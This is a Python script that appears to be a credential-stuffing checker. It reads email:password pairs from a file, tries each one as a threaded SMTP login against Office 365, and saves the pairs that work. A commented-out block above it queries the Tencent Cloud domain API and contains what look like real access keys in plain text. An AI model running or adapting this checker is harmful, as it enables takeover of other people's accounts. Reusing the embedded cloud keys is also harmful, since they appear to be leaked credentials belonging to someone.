# import json
# from tencentcloud.common import credential
# from tencentcloud.common.profile.client_profile import ClientProfile
# from tencentcloud.common.profile.http_profile import HttpProfile
# from tencentcloud.common.exception.tencent_cloud_sdk_exception import TencentCloudSDKException
# from tencentcloud.domain.v20180808 import domain_client, models
#
# try:
#     # Read domain names from a text file
#     with open('E:/edu_mail/jetbrains/jetedu.txt', 'r') as f:
#         domains = [line.strip() for line in f]
#
#     # Instantiate a credential object using your SecretId and SecretKey
#     cred = credential.Credential("AKIDdBZks2ziHk8XHqMirmX9XkplZ9UcXbS5", "Vv9ByXsAE4YpsjOo0ylJchYP3WlneJtL")
#
#     # Set up an HttpProfile object with the endpoint for the Domain product's API
#     httpProfile = HttpProfile()
#     httpProfile.endpoint = "domain.tencentcloudapi.com"
#
#     # Set up a ClientProfile object with the HttpProfile
#     clientProfile = ClientProfile()
#     clientProfile.httpProfile = httpProfile
#
#     # Create a DomainClient object using the credential and clientProfile objects
#     client = domain_client.DomainClient(cred, "", clientProfile)
#
#     # Loop over each domain name and create a CheckDomainRequest for it
#     for domain_name in domains:
#         req = models.CheckDomainRequest()
#         params = {
#             "DomainName": domain_name
#         }
#         req.from_json_string(json.dumps(params))
#
#         # Send the request to the DomainClient object and print the response
#         resp = client.CheckDomain(req)
#         print(f"{domain_name}: {resp.to_json_string()}")
#
# except TencentCloudSDKException as err:
#     print(err)

import smtplib
import threading

def check_password(email, password):
    try:
        with smtplib.SMTP('smtp.office365.com', 587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.login(email, password)
            return True
    except:
        return False


class CheckPasswordThread(threading.Thread):
    def __init__(self, email, password, output_file):
        super().__init__()
        self.email = email
        self.password = password
        self.output_file = output_file

    def run(self):
        if check_password(self.email, self.password):
            print(f'{self.email}: 密码正确')
            with open(self.output_file, 'a') as f:
                f.write(f'{self.email}:{self.password}\n')
        else:
            print(f'{self.email}: 密码错误，已删除')


if __name__ == '__main__':
    input_file = 'E:/edu_mail/edy.txt'
    output_file = 'E:/edu_mail/edu_ma.txt'

    threads = []
    with open(input_file) as f:
        for line in f:
            email, password = line.strip().split(':')
            thread = CheckPasswordThread(email, password, output_file)
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()